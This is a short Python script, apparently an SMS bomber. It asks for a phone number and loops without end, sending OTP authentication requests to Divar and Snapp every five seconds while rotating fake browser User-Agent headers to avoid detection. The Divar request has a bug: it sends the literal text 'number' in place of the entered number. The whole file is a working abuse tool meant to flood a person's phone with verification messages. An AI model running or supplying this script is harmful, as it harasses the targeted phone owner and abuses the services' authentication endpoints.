import requests
import random
import time

number = input("Enter Your Phone Number (without 0) : ")

url_Divar = "https://api.divar.ir/v5/auth/authenticate"
json_Divar = {"phone":"number"}

url_snapp = "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp"
json_snapp = {"cellphone":"+98" + number}

heads = [
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 firefox/76.0', 'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 firefox/72.0", 'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 firefox/72.0", 'Accept': '*/*'
    },
    {
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 firefox/72.0', 'Accept': '*/*'
    },
    {
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 firefox/72.0", 'Accept': '*/*'
    },
]

while True :

    random_head = random.choice(heads)

    req = requests.post(url=url_Divar,json=json_Divar,headers=random_head)
    print(req)

    req1 = requests.post(url=url_snapp,json=json_snapp,headers=random_head)
    print(req1)


    time.sleep(5)